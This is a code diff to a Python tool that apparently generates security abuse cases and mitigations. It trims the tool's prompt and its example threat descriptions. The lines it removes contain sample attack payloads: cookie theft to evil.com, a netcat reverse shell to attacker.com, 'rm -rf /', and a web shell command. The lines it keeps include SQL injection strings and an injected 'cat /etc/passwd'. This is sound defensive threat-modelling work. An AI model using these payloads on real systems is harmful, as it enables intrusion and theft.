@@ -28,41 +28,30 @@ class SecurityRequirementsAnalyzer:
     """Analyzes user stories to generate security requirements using AI"""
 
     # Default prompt instructions that can be customized via settings
-    DEFAULT_ABUSE_CASE_PROMPT = """Generate 5-7 highly detailed abuse cases. For EACH abuse case provide:
+    DEFAULT_ABUSE_CASE_PROMPT = """Generate 5-7 detailed abuse cases. For EACH abuse case provide:
 
 1. **Threat Title**: Specific attack name (e.g., "SQL Injection via Search Parameter", "Session Hijacking through XSS")
-2. **Threat Actor**: External Attacker / Malicious Insider / Automated Bot / Competitor / Nation-State Actor
-3. **Attack Prerequisites**:
-   • Required knowledge or access level
-   • Tools and resources needed
-   • Time and effort estimation
-4. **Detailed Attack Scenario** (MUST be 8-12 lines):
-   • RECONNAISSANCE: How attacker discovers the vulnerability (port scanning, directory enumeration, source code review)
-   • WEAPONIZATION: Tools prepared (Burp Suite, SQLMap, Metasploit, Hydra, custom scripts)
-   • DELIVERY: Attack vector used (malicious URL, crafted input, uploaded file, API call)
-   • EXPLOITATION: Step-by-step technical execution with example payloads
-   • INSTALLATION: Persistence mechanisms if applicable
-   • COMMAND & CONTROL: Data exfiltration methods
-   • ACTIONS ON OBJECTIVES: Final impact (data theft, privilege escalation, system compromise)
-5. **Technical Details**:
-   • Example attack payloads or commands
-   • Vulnerable code patterns exploited
-   • Network protocols or APIs abused
-6. **Impact Assessment**:
-   • Confidentiality impact (data exposed)
-   • Integrity impact (data modified)
-   • Availability impact (service disruption)
-   • Financial impact estimation
-   • Regulatory/compliance implications
-7. **Likelihood Factors**: High/Medium/Low with justification based on attack complexity and attacker motivation
-8. **STRIDE Category**: Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege
-9. **Detailed Mitigations** (provide 5-6 specific mitigations):
+2. **Threat Actor**: External Attacker / Malicious Insider / Automated Bot / Competitor
+3. **Attack Description** (6-8 bullet points):
+   • How the attacker discovers and exploits the vulnerability
+   • Tools and techniques used (Burp Suite, SQLMap, custom scripts, etc.)
+   • Step-by-step attack execution with example payloads
+   • Data or assets targeted
+   • Potential for lateral movement or persistence
+   • Real-world examples if applicable
+4. **Impact Assessment**:
+   • Confidentiality: Data exposed or stolen
+   • Integrity: Data modified or corrupted
+   • Availability: Service disruption potential
+   • Business Impact: Financial loss, regulatory fines, reputation damage
+5. **Likelihood**: High/Medium/Low with brief justification
+6. **STRIDE Category**: Spoofing/Tampering/Repudiation/Information Disclosure/Denial of Service/Elevation of Privilege
+7. **Mitigations** (5-6 specific controls):
    • Preventive controls with implementation details
-   • Detective controls (monitoring, alerting)
-   • Corrective controls (incident response)
-   • Specific libraries/frameworks (e.g., OWASP ESAPI, helmet.js, bcrypt)
-   • Configuration examples
-   • Verification through security testing (SAST, DAST, penetration test)"""
+   • Specific libraries/frameworks to use
+   • Configuration recommendations
+   • Monitoring and detection approaches
+   • Verification methods (SAST, DAST, penetration testing)"""
 
     DEFAULT_SECURITY_REQ_PROMPT = """Generate 8-10 highly detailed security requirements. For EACH requirement provide:
 
@@ -424,50 +413,50 @@ Return ONLY valid JSON with proper escaping."""
                 "abuse_cases": [
                     {
                         "title": "Brute Force Password Attack",
-                        "description": "• RECONNAISSANCE: Attacker identifies login endpoint through directory enumeration and observes authentication flow\n• WEAPONIZATION: Prepares wordlists from common passwords, leaked databases, and generates variations using tools like Hashcat rules\n• DELIVERY: Uses automated tools (Hydra, Burp Intruder, custom Python scripts) to submit rapid login attempts\n• EXPLOITATION: Bypasses weak rate limiting by rotating IP addresses through proxy chains or botnets\n• TECHNICAL DETAILS: POST /api/auth/login with username/password combinations at 100+ requests/second\n• IMPACT: Unauthorized account access leading to data theft, identity fraud, or lateral movement within the system\n• BUSINESS IMPACT: Customer data breach, regulatory fines (GDPR up to 4% revenue), reputation damage",
+                        "description": "• Attacker identifies login endpoint and tests for rate limiting weaknesses\n• Uses automated tools (Hydra, Burp Intruder) to submit thousands of password combinations\n• Bypasses weak rate limits by rotating IP addresses through proxy networks\n• Targets common passwords, dictionary words, and leaked credential databases\n• Successful compromise grants full access to victim's account and data\n• Can lead to lateral movement if user has elevated privileges",
                         "threat_actor": "External Attacker / Automated Bot",
                         "impact": "Critical",
                         "likelihood": "High",
                         "stride_category": "Spoofing",
                         "mitigations": [
-                            "Implement progressive rate limiting: 5 attempts/minute, 20 attempts/hour per IP and username combination",
-                            "Deploy CAPTCHA (reCAPTCHA v3 or hCaptcha) after 3 failed attempts",
+                            "Implement progressive rate limiting: 5 attempts/minute per IP and username",
+                            "Deploy CAPTCHA after 3 consecutive failed attempts",
                             "Implement account lockout with exponential backoff (15min, 1hr, 24hr)",
-                            "Use bcrypt or Argon2id for password hashing with cost factor >= 12",
-                            "Monitor and alert on authentication anomalies using SIEM integration",
-                            "Require MFA for all accounts, especially privileged users"
+                            "Use Argon2id or bcrypt for password hashing with cost factor >= 12",
+                            "Configure SIEM alerts for authentication anomalies",
+                            "Enforce MFA for all user accounts"
                         ]
                     },
                     {
                         "title": "Credential Stuffing Attack",
-                        "description": "• RECONNAISSANCE: Attacker obtains leaked credential databases from dark web marketplaces or previous breaches\n• WEAPONIZATION: Cross-references emails with target application's user base using OSINT techniques\n• DELIVERY: Uses credential stuffing tools (Sentry MBA, OpenBullet, custom scripts) with proxy rotation\n• EXPLOITATION: Exploits password reuse across multiple services - studies show 65% of users reuse passwords\n• TECHNICAL DETAILS: Automated login attempts using username:password pairs from breaches like Collection #1-5\n• IMPACT: Mass account takeover affecting potentially thousands of users\n• BUSINESS IMPACT: Customer trust erosion, class action lawsuits, mandatory breach notifications",
+                        "description": "• Attacker obtains leaked credentials from dark web or previous data breaches\n• Uses automated tools to test stolen username/password pairs against login endpoint\n• Exploits password reuse - approximately 65% of users reuse passwords across services\n• Rotates through proxy networks to avoid IP-based blocking\n• Successful attacks can compromise thousands of accounts rapidly\n• Similar to British Airways (2018) and Zoom (2020) credential stuffing incidents",
                         "threat_actor": "External Attacker / Organized Crime",
                         "impact": "Critical",
                         "likelihood": "High",
                         "stride_category": "Spoofing",
                         "mitigations": [
-                            "Integrate with HaveIBeenPwned API to check passwords against known breaches",
-                            "Implement device fingerprinting and behavioral analysis for anomaly detection",
-                            "Require email/SMS verification for logins from new devices or locations",
-                            "Deploy Web Application Firewall (WAF) with bot detection capabilities",
-                            "Implement login velocity checks across the entire platform",
-                            "Force password reset for accounts detected in breach databases"
+                            "Integrate HaveIBeenPwned API to detect compromised passwords",
+                            "Implement device fingerprinting and behavioral anomaly detection",
+                            "Require step-up authentication for logins from new devices/locations",
+                            "Deploy WAF with bot detection and challenge capabilities",
+                            "Monitor login velocity across the platform",
+                            "Proactively reset passwords found in breach databases"
                         ]
                     },
                     {
                         "title": "Session Hijacking via Token Theft",
-                        "description": "• RECONNAISSANCE: Attacker analyzes session management mechanism through traffic interception\n• WEAPONIZATION: Sets up network sniffing on shared WiFi or compromises client machine\n• DELIVERY: Intercepts session tokens via XSS, network sniffing, or malware on victim's device\n• EXPLOITATION: Replays stolen session token to impersonate legitimate user without credentials\n• TECHNICAL DETAILS: Stealing JWT from localStorage/sessionStorage via XSS, or session cookie via network MITM\n• IMPACT: Complete account takeover with full access to user's data and permissions\n• BUSINESS IMPACT: Unauthorized transactions, data exfiltration, compliance violations",
+                        "description": "• Attacker intercepts session tokens through XSS, network sniffing, or malware\n• Tokens stored in localStorage/sessionStorage are vulnerable to JavaScript access\n• Network interception possible on unencrypted connections or compromised networks\n• Stolen token allows full impersonation without knowing user credentials\n• Attacker gains complete access to victim's account and permissions\n• Can perform unauthorized transactions or exfiltrate sensitive data",
                         "threat_actor": "External Attacker / Malicious Insider",
                         "impact": "High",
                         "likelihood": "Medium",
                         "stride_category": "Spoofing",
                         "mitigations": [
-                            "Store tokens in httpOnly, secure, sameSite=strict cookies instead of localStorage",
-                            "Implement short-lived access tokens (15 min) with refresh token rotation",
-                            "Bind session to client fingerprint (IP, User-Agent hash) with re-authentication on change",
-                            "Implement token revocation on password change or security events",
-                            "Use TLS 1.3 for all communications with HSTS preload",
-                            "Monitor for concurrent sessions from different geographic locations"
+                            "Store tokens in httpOnly, secure, sameSite=strict cookies",
+                            "Use short-lived access tokens (15 min) with refresh token rotation",
+                            "Bind sessions to client fingerprint with re-auth on significant changes",
+                            "Implement immediate token revocation on password change",
+                            "Enforce TLS 1.3 with HSTS preload for all communications",
+                            "Alert on concurrent sessions from different locations"
                         ]
                     }
                 ],
@@ -516,50 +505,50 @@ Return ONLY valid JSON with proper escaping."""
                 "abuse_cases": [
                     {
                         "title": "Payment Card Data Theft via Formjacking",
-                        "description": "• RECONNAISSANCE: Attacker identifies payment form endpoints and JavaScript dependencies\n• WEAPONIZATION: Creates malicious JavaScript payload that captures card data on form submission\n• DELIVERY: Compromises third-party JavaScript library or injects script via XSS vulnerability\n• EXPLOITATION: Malicious script silently exfiltrates card numbers, CVV, expiry to attacker's server\n• TECHNICAL DETAILS: JavaScript keylogger on input fields: document.querySelector('#card-number').addEventListener('input', exfil)\n• REAL-WORLD EXAMPLE: British Airways breach (2018) - 380,000 cards stolen via formjacking\n• IMPACT: Mass payment card theft, PCI-DSS non-compliance, mandatory breach notification\n• BUSINESS IMPACT: Fines up to $500K per incident, card brand penalties, customer lawsuits",
-                        "threat_actor": "External Attacker / Organized Crime (Magecart groups)",
+                        "description": "• Attacker injects malicious JavaScript into payment page via compromised third-party library or XSS\n• Script captures card numbers, CVV, and expiry dates as users enter them\n• Data silently exfiltrated to attacker-controlled server in real-time\n• Users and merchants unaware of theft until fraudulent transactions occur\n• Similar to British Airways breach (2018) affecting 380,000 cards\n• Results in PCI-DSS non-compliance and mandatory breach notification",
+                        "threat_actor": "External Attacker / Organized Crime",
                         "impact": "Critical",
                         "likelihood": "Medium",
                         "stride_category": "Information Disclosure",
                         "mitigations": [
-                            "Implement Content Security Policy (CSP) with strict script-src directives",
+                            "Implement strict Content Security Policy (CSP) with script-src directives",
                             "Use Subresource Integrity (SRI) for all third-party JavaScript",
-                            "Host payment forms on isolated subdomain with minimal JavaScript",
-                            "Implement real-time JavaScript integrity monitoring",
-                            "Use payment tokenization (Stripe Elements, Braintree Hosted Fields) to avoid handling raw card data",
-                            "Regular security scanning of all JavaScript dependencies"
+                            "Host payment forms on isolated subdomain with minimal dependencies",
+                            "Use payment tokenization (Stripe Elements, Braintree) to avoid handling raw card data",
+                            "Monitor JavaScript integrity with real-time change detection",
+                            "Conduct regular security scans of all JavaScript dependencies"
                         ]
                     },
                     {
                         "title": "Transaction Amount Manipulation",
-                        "description": "• RECONNAISSANCE: Attacker analyzes checkout flow using browser DevTools and proxy interception\n• WEAPONIZATION: Identifies client-side price calculations or hidden form fields with amounts\n• DELIVERY: Uses Burp Suite to intercept and modify POST request with payment details\n• EXPLOITATION: Changes price from $100.00 to $1.00 in request body before server processes\n• TECHNICAL DETAILS: Modify JSON payload: {'item_id': '123', 'price': 1.00, 'quantity': 1}\n• IMPACT: Financial loss from products sold below cost, inventory discrepancies\n• BUSINESS IMPACT: Direct revenue loss, potential for large-scale fraud if automated",
-                        "threat_actor": "External Attacker / Opportunistic Fraudster",
+                        "description": "• Attacker intercepts checkout request using browser tools or proxy (Burp Suite)\n• Modifies price field in request body before submission to server\n• Changes $100.00 purchase to $1.00 if server trusts client-side pricing\n• Can be automated for large-scale fraud across multiple transactions\n• Results in direct financial loss and inventory discrepancies\n• Indicates fundamental flaw in payment flow architecture",
+                        "threat_actor": "External Attacker / Fraudster",
                         "impact": "High",
                         "likelihood": "High",
                         "stride_category": "Tampering",
                         "mitigations": [
-                            "Never trust client-side price calculations - always calculate amounts server-side from product catalog",
-                            "Sign cart contents with HMAC to detect tampering",
-                            "Implement server-side validation comparing submitted price against database price",
-                            "Log all price discrepancies for fraud investigation",
-                            "Use transaction signing for high-value purchases",
-                            "Implement velocity checks for unusual purchasing patterns"
+                            "Calculate all prices server-side from product catalog at checkout time",
+                            "Sign cart contents with HMAC to detect any tampering",
+                            "Validate submitted prices against database before processing",
+                            "Log and alert on any price discrepancies",
+                            "Implement velocity checks for unusual purchasing patterns",
+                            "Use transaction signing for high-value purchases"
                         ]
                     },
                     {
                         "title": "Card Testing Fraud (Carding Attack)",
-                        "description": "• RECONNAISSANCE: Attacker obtains lists of potentially valid card numbers from dark web\n• WEAPONIZATION: Sets up automated scripts to test card validity via small transactions\n• DELIVERY: Submits hundreds of $1 transactions to verify which cards are active\n• EXPLOITATION: Validated cards sold on dark web or used for larger fraudulent purchases\n• TECHNICAL DETAILS: Automated POST to /checkout with rotating card numbers, checking for success response\n• IMPACT: High chargeback rates, payment processor penalties, account termination\n• BUSINESS IMPACT: Chargeback fees ($15-100 per incident), processor relationship damage",
+                        "description": "• Attacker uses automated scripts to test validity of stolen card numbers\n• Submits small transactions ($1-5) to verify which cards are active\n• Validated cards sold on dark web or used for larger fraudulent purchases\n• Results in high chargeback rates threatening payment processor relationship\n• Can process hundreds of card tests per hour without proper controls\n• Chargeback fees range from $15-100 per incident plus potential account termination",
                         "threat_actor": "External Attacker / Automated Bot",
                         "impact": "High",
                         "likelihood": "High",
                         "stride_category": "Tampering",
                         "mitigations": [
-                            "Implement CAPTCHA on payment forms after first failed attempt",
-                            "Use 3D Secure 2.0 for all card-not-present transactions",
-                            "Implement velocity limits: max 3 card attempts per session/IP",
-                            "Deploy fraud detection ML models (Stripe Radar, Signifyd)",
-                            "Block known proxy/VPN IP ranges on payment endpoints",
-                            "Require AVS (Address Verification) and CVV match"
+                            "Implement CAPTCHA after first failed payment attempt",
+                            "Enable 3D Secure 2.0 for all card-not-present transactions",
+                            "Enforce velocity limits: max 3 card attempts per session/IP",
+                            "Deploy fraud detection ML (Stripe Radar, Signifyd)",
+                            "Require AVS (Address Verification) and CVV match",
+                            "Block known proxy/VPN IP ranges on payment endpoints"
                         ]
                     }
                 ],
@@ -608,50 +597,50 @@ Return ONLY valid JSON with proper escaping."""
                 "abuse_cases": [
                     {
                         "title": "SQL Injection Attack",
-                        "description": "• RECONNAISSANCE: Attacker probes input fields with single quotes and SQL syntax to identify vulnerable parameters\n• WEAPONIZATION: Crafts SQL injection payloads using SQLMap or manual techniques\n• DELIVERY: Submits malicious input via search box, login form, or URL parameters\n• EXPLOITATION: Executes arbitrary SQL: ' OR '1'='1' -- or UNION SELECT for data extraction\n• TECHNICAL DETAILS: Input: admin'-- in username field bypasses authentication; UNION SELECT password FROM users extracts credentials\n• DATA EXFILTRATION: Uses blind SQL injection techniques (time-based, boolean-based) to extract data character by character\n• IMPACT: Complete database compromise - read, modify, delete any data; potential for OS command execution via xp_cmdshell\n• BUSINESS IMPACT: Data breach affecting all customers, GDPR fines up to €20M, class action lawsuits",
+                        "description": "• Attacker tests input fields with SQL syntax (single quotes, comments) to find vulnerable parameters\n• Injects malicious SQL via search boxes, login forms, or URL parameters\n• Can bypass authentication using payloads like: admin'-- or ' OR '1'='1\n• Extracts sensitive data using UNION SELECT queries or blind injection techniques\n• Complete database compromise possible - read, modify, or delete any data\n• May escalate to OS command execution on misconfigured database servers",
                         "threat_actor": "External Attacker",
                         "impact": "Critical",
                         "likelihood": "High",
                         "stride_category": "Tampering",
                         "mitigations": [
-                            "Use parameterized queries/prepared statements exclusively - NEVER concatenate user input into SQL",
-                            "Implement ORM (SQLAlchemy, Hibernate, Entity Framework) with parameterized queries",
-                            "Apply input validation with whitelist approach - reject unexpected characters",
-                            "Use database accounts with minimal privileges (no DROP, no xp_cmdshell)",
+                            "Use parameterized queries/prepared statements exclusively",
+                            "Implement ORM (SQLAlchemy, Hibernate) with parameterized queries",
+                            "Apply input validation with whitelist approach",
+                            "Use database accounts with minimal privileges",
                             "Deploy WAF rules for SQL injection patterns",
-                            "Regular SAST scanning with tools like Semgrep, SonarQube for SQL injection vulnerabilities"
+                            "Run regular SAST scans (Semgrep, SonarQube) for injection vulnerabilities"
                         ]
                     },
                     {
                         "title": "Cross-Site Scripting (XSS) Attack",
-                        "description": "• RECONNAISSANCE: Attacker identifies input fields that reflect content back to users without encoding\n• WEAPONIZATION: Creates malicious JavaScript payloads for cookie theft or session hijacking\n• DELIVERY: Injects script via comment field, profile name, or URL parameter\n• EXPLOITATION: Stored XSS: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n• TECHNICAL DETAILS: Reflected XSS via search: /search?q=<script>alert(1)</script>; DOM XSS via innerHTML\n• SESSION HIJACKING: Steals session cookies, JWT tokens from localStorage, or performs actions as victim\n• IMPACT: Account takeover, data theft, malware distribution, defacement\n• BUSINESS IMPACT: Customer trust erosion, compliance violations, potential for worm-like spreading",
+                        "description": "• Attacker injects malicious JavaScript through input fields that reflect content without encoding\n• Stored XSS persists in database and executes for all users viewing affected content\n• Reflected XSS delivered via malicious links sent to victims\n• Can steal session cookies, tokens, or perform actions as the victim user\n• Enables account takeover, data theft, and malware distribution\n• May spread virally if injected content is shared between users",
                         "threat_actor": "External Attacker",
                         "impact": "High",
                         "likelihood": "High",
                         "stride_category": "Information Disclosure",
                         "mitigations": [
-                            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS contexts)",
-                            "Use templating engines with auto-escaping (React, Angular, Jinja2 with autoescape)",
-                            "Deploy Content Security Policy (CSP) with strict script-src directive",
-                            "Set httpOnly flag on session cookies to prevent JavaScript access",
-                            "Use DOMPurify for sanitizing any user-generated HTML content",
-                            "Implement X-XSS-Protection and X-Content-Type-Options headers"
+                            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS)",
+                            "Use templating engines with auto-escaping (React, Angular, Jinja2)",
+                            "Deploy Content Security Policy (CSP) with strict script-src",
+                            "Set httpOnly and secure flags on session cookies",
+                            "Use DOMPurify for sanitizing user-generated HTML content",
+                            "Configure X-Content-Type-Options: nosniff header"
                         ]
                     },
                     {
                         "title": "Command Injection Attack",
-                        "description": "• RECONNAISSANCE: Attacker identifies functionality that may execute system commands (file operations, ping, etc.)\n• WEAPONIZATION: Crafts payloads to break out of intended command and execute arbitrary commands\n• DELIVERY: Injects shell metacharacters via input field: filename; rm -rf / or filename | nc attacker.com 4444 -e /bin/sh\n• EXPLOITATION: Achieves remote code execution on server, installs backdoor or exfiltrates data\n• TECHNICAL DETAILS: If code uses os.system('ping ' + user_input), attacker sends: 8.8.8.8; cat /etc/passwd\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, business continuity impact",
+                        "description": "• Attacker identifies functionality that executes system commands (file ops, network utilities)\n• Injects shell metacharacters to execute arbitrary commands on the server\n• Example: input of '8.8.8.8; cat /etc/passwd' in a ping function\n• Achieves remote code execution with application's privilege level\n• Can install backdoors, exfiltrate data, or pivot to other systems\n• Complete server compromise possible leading to ransomware deployment",
                         "threat_actor": "External Attacker",
                         "impact": "Critical",
                         "likelihood": "Medium",
                         "stride_category": "Elevation of Privilege",
                         "mitigations": [
-                            "NEVER pass user input to system commands - use language-native libraries instead",
-                            "If system commands unavoidable, use allowlist validation and parameterized execution",
-                            "Run application with minimal OS privileges (non-root, restricted shell)",
-                            "Implement sandboxing (containers, seccomp) to limit command execution scope",
-                            "Use subprocess with shell=False in Python, avoid Runtime.exec() with string concatenation in Java",
-                            "Deploy RASP (Runtime Application Self-Protection) for command injection detection"
+                            "Avoid passing user input to system commands - use native libraries instead",
+                            "If commands required, use strict allowlist validation",
+                            "Run application with minimal OS privileges (non-root)",
+                            "Implement container sandboxing to limit execution scope",
+                            "Use subprocess with shell=False in Python",
+                            "Deploy RASP for real-time command injection detection"
                         ]
                     }
                 ],
@@ -699,50 +688,50 @@ Return ONLY valid JSON with proper escaping."""
                 "abuse_cases": [
                     {
                         "title": "Web Shell Upload via File Type Bypass",
-                        "description": "• RECONNAISSANCE: Attacker identifies file upload functionality and tests accepted file types\n• WEAPONIZATION: Creates PHP/JSP/ASPX web shell with disguised extension (shell.php.jpg, shell.php%00.jpg)\n• DELIVERY: Uploads malicious file exploiting weak validation (extension-only check, MIME type trust)\n• EXPLOITATION: Accesses uploaded shell via direct URL, gains remote code execution on server\n• TECHNICAL DETAILS: Upload shell.php with Content-Type: image/jpeg; access /uploads/shell.php?cmd=whoami\n• PERSISTENCE: Installs additional backdoors, creates privileged accounts, establishes C2 channel\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, incident response costs ($4M+ average breach cost)",
+                        "description": "• Attacker uploads executable script disguised with innocent extension (shell.php.jpg)\n• Exploits weak validation that only checks file extension or trusts MIME type\n• Accesses uploaded file directly to execute arbitrary commands on server\n• Gains remote code execution with web application's privileges\n• Can install persistent backdoors, create admin accounts, or exfiltrate data\n• Average breach cost exceeds $4M including incident response and regulatory fines",
                         "threat_actor": "External Attacker",
                         "impact": "Critical",
                         "likelihood": "High",
                         "stride_category": "Elevation of Privilege",
                         "mitigations": [
-                            "Validate file type using magic bytes (file signatures), not extension or MIME type",
+                            "Validate file type using magic bytes, not extension or MIME type",
                             "Store uploads outside web root with randomized filenames",
-                            "Serve files through a handler that sets Content-Disposition: attachment",
-                            "Implement antivirus/malware scanning (ClamAV) on all uploads",
-                            "Use separate domain for user content (CDN) with no script execution",
-                            "Strip metadata and re-encode images to remove embedded code"
+                            "Serve files with Content-Disposition: attachment header",
+                            "Implement antivirus scanning (ClamAV) on all uploads",
+                            "Use separate domain for user content with no script execution",
+                            "Re-encode images to remove any embedded executable code"
                         ]
                     },
                     {
                         "title": "Path Traversal via Filename Manipulation",
-                        "description": "• RECONNAISSANCE: Attacker tests filename handling by uploading files with special characters\n• WEAPONIZATION: Crafts filename with path traversal sequences: ../../../etc/passwd or ..\\..\\windows\\system32\n• DELIVERY: Uploads file with malicious filename through intercepted request\n• EXPLOITATION: File saved outside intended directory, potentially overwriting critical system files\n• TECHNICAL DETAILS: Filename: ../../../var/www/html/shell.php overwrites web application files\n• IMPACT: Arbitrary file write leading to RCE, configuration tampering, or data destruction\n• BUSINESS IMPACT: System integrity compromise, potential for complete takeover",
+                        "description": "• Attacker crafts filename with directory traversal sequences (../../../)\n• Bypasses upload directory restrictions to write files anywhere on filesystem\n• Can overwrite application files, configuration, or system files\n• May achieve remote code execution by overwriting executable content\n• Results in data destruction, configuration tampering, or complete compromise\n• Indicates fundamental flaw in file handling implementation",
                         "threat_actor": "External Attacker",
                         "impact": "Critical",
                         "likelihood": "Medium",
                         "stride_category": "Tampering",
                         "mitigations": [
-                            "Generate server-side filenames (UUID), never use client-provided filenames",
-                            "If original filename needed, sanitize by removing path separators and special characters",
-                            "Validate final path is within intended upload directory (canonical path check)",
-                            "Use chroot or containerization to limit file system access",
-                            "Set restrictive file system permissions on upload directory",
+                            "Generate server-side filenames (UUID), never use client-provided names",
+                            "Sanitize filenames by removing path separators and special characters",
+                            "Validate resolved path is within intended upload directory",
+                            "Use containerization to limit filesystem access scope",
+                            "Set restrictive permissions on upload directory",
                             "Log all file operations with original and sanitized filenames"
                         ]
                     },
                     {
                         "title": "Denial of Service via Resource Exhaustion",
-                        "description": "• RECONNAISSANCE: Attacker identifies file upload endpoints and size limits\n• WEAPONIZATION: Creates scripts to upload maximum-size files repeatedly or uses zip bombs\n• DELIVERY: Floods upload endpoint with large files or specially crafted archives\n• EXPLOITATION: Exhausts disk space, memory (during processing), or bandwidth\n• TECHNICAL DETAILS: Upload 10GB file repeatedly; or 42.zip (zip bomb) that expands to 4.5 petabytes\n• IMPACT: Service unavailability, storage costs, processing delays for legitimate users\n• BUSINESS IMPACT: Downtime, SLA violations, infrastructure costs",
+                        "description": "• Attacker floods upload endpoint with maximum-size files repeatedly\n• May use zip bombs that expand to massive sizes during processing\n• Exhausts disk space, memory, or processing capacity\n• Causes service unavailability for legitimate users\n• Results in infrastructure costs and SLA violations\n• Can be automated for sustained attack with minimal attacker resources",
                         "threat_actor": "External Attacker / Competitor",
                         "impact": "High",
                         "likelihood": "Medium",
                         "stride_category": "Denial of Service",
                         "mitigations": [
-                            "Implement strict file size limits (e.g., 10MB) enforced at web server level",
-                            "Use streaming upload processing to reject oversized files early",
+                            "Enforce file size limits at web server level (10MB default)",
+                            "Use streaming processing to reject oversized files early",
                             "Implement per-user and per-IP upload quotas",
-                            "Detect and reject archive bombs by limiting decompression ratio",
-                            "Use separate storage volume for uploads with quota limits",
-                            "Implement rate limiting on upload endpoints"
+                            "Detect archive bombs by limiting decompression ratio",
+                            "Use separate storage volume with quota limits",
+                            "Apply rate limiting on upload endpoints"
                         ]
                     }
                 ],
@@ -791,50 +780,50 @@ Return ONLY valid JSON with proper escaping."""
                 "abuse_cases": [
                     {
                         "title": "Broken Object Level Authorization (BOLA/IDOR)",
-                        "description": "• RECONNAISSANCE: Attacker analyzes API responses to identify object ID patterns (sequential IDs, UUIDs)\n• WEAPONIZATION: Creates script to enumerate object IDs or manipulate IDs in requests\n• DELIVERY: Modifies API request: GET /api/users/123/orders to GET /api/users/124/orders\n• EXPLOITATION: Accesses other users' data by changing resource identifiers\n• TECHNICAL DETAILS: API returns data based on ID without verifying requestor owns that resource\n• IMPACT: Mass data exposure, privacy violations, access to sensitive records\n• BUSINESS IMPACT: GDPR/CCPA violations, customer data breach, regulatory fines",
+                        "description": "• Attacker manipulates resource IDs in API requests to access other users' data\n• Changes /api/users/123/orders to /api/users/124/orders to view another user's orders\n• API returns data without verifying the requestor owns the requested resource\n• Can enumerate through sequential IDs to extract data at scale\n• Results in mass data exposure and privacy violations\n• BOLA is the #1 API vulnerability according to OWASP API Security Top 10",
                         "threat_actor": "External Attacker / Malicious User",
                         "impact": "Critical",
                         "likelihood": "High",
                         "stride_category": "Information Disclosure",
                         "mitigations": [
-                            "Implement object-level authorization checks on every API endpoint",
-                            "Use indirect references (user-specific mapping) instead of direct database IDs",
+                            "Implement object-level authorization on every API endpoint",
+                            "Use indirect references instead of direct database IDs",
                             "Verify resource ownership against authenticated user context",
                             "Use UUIDs instead of sequential IDs to prevent enumeration",
-                            "Implement automated BOLA testing in CI/CD pipeline",
-                            "Log and alert on access pattern anomalies"
+                            "Add automated BOLA testing to CI/CD pipeline",
+                            "Monitor and alert on unusual access patterns"
                         ]
                     },
                     {
                         "title": "API Rate Limiting Bypass and Abuse",
-                        "description": "• RECONNAISSANCE: Attacker tests rate limits by sending requests at increasing rates\n• WEAPONIZATION: Identifies bypass techniques: rotating IPs, API key cycling, header manipulation\n• DELIVERY: Launches distributed attack from multiple IPs or exploits rate limit per-endpoint gaps\n• EXPLOITATION: Overwhelms API with requests causing DoS, or performs mass data scraping\n• TECHNICAL DETAILS: 10,000 requests/minute from botnet; or scrapes entire user database via pagination\n• IMPACT: Service degradation, infrastructure costs, competitive data theft\n• BUSINESS IMPACT: SLA violations, customer impact, increased cloud costs",
-                        "threat_actor": "External Attacker / Competitor / Automated Bot",
+                        "description": "• Attacker identifies rate limiting gaps by testing request volumes\n• Bypasses limits using IP rotation, API key cycling, or header manipulation\n• Overwhelms API causing service degradation for legitimate users\n• May scrape entire databases through paginated endpoints\n• Results in infrastructure costs and potential data theft\n• Causes SLA violations and customer impact",
+                        "threat_actor": "External Attacker / Automated Bot",
                         "impact": "High",
                         "likelihood": "High",
                         "stride_category": "Denial of Service",
                         "mitigations": [
-                            "Implement tiered rate limiting: per-IP, per-user, per-API-key, global",
-                            "Use token bucket or sliding window algorithms for rate limiting",
-                            "Deploy API gateway with DDoS protection (AWS API Gateway, Cloudflare)",
+                            "Implement tiered rate limiting: per-IP, per-user, per-API-key",
+                            "Use token bucket or sliding window rate limiting algorithms",
+                            "Deploy API gateway with DDoS protection",
                             "Implement request signing to prevent replay attacks",
                             "Monitor and alert on unusual traffic patterns",
-                            "Use CAPTCHA for sensitive operations after threshold"
+                            "Add CAPTCHA for sensitive operations after threshold"
                         ]
                     },
                     {
                         "title": "Mass Assignment / Excessive Data Exposure",
-                        "description": "• RECONNAISSANCE: Attacker examines API responses for unexpected data fields\n• WEAPONIZATION: Adds additional fields to POST/PUT requests to modify protected attributes\n• DELIVERY: Sends request with extra fields: PUT /api/users/me {\"name\": \"John\", \"role\": \"admin\", \"balance\": 999999}\n• EXPLOITATION: Modifies fields not intended to be user-controllable (role, permissions, balance)\n• TECHNICAL DETAILS: API blindly binds request body to database model without filtering\n• IMPACT: Privilege escalation, data tampering, financial fraud\n• BUSINESS IMPACT: Unauthorized access, data integrity issues, compliance violations",
+                        "description": "• Attacker adds unauthorized fields to API requests (role, permissions, balance)\n• API blindly binds request body to database model without filtering\n• Can escalate privileges by setting admin role or modify financial data\n• API responses may expose sensitive fields not intended for client\n• Results in unauthorized access and data integrity violations\n• Indicates missing input validation and response filtering",
                         "threat_actor": "External Attacker / Malicious User",
                         "impact": "High",
                         "likelihood": "Medium",
                         "stride_category": "Tampering",
                         "mitigations": [
-                            "Define explicit allowlist of fields that can be modified per endpoint",
-                            "Use DTOs/schemas that only include intended fields (Pydantic, Marshmallow)",
+                            "Define explicit allowlist of modifiable fields per endpoint",
+                            "Use DTOs/schemas with only intended fields (Pydantic, Marshmallow)",
                             "Never bind request body directly to database models",
-                            "Remove sensitive fields from API responses (password hash, internal IDs)",
+                            "Remove sensitive fields from API responses",
                             "Implement field-level authorization for sensitive attributes",
-                            "Document and test all API fields with security review"
+                            "Document and security review all API fields"
                         ]
                     }
                 ],
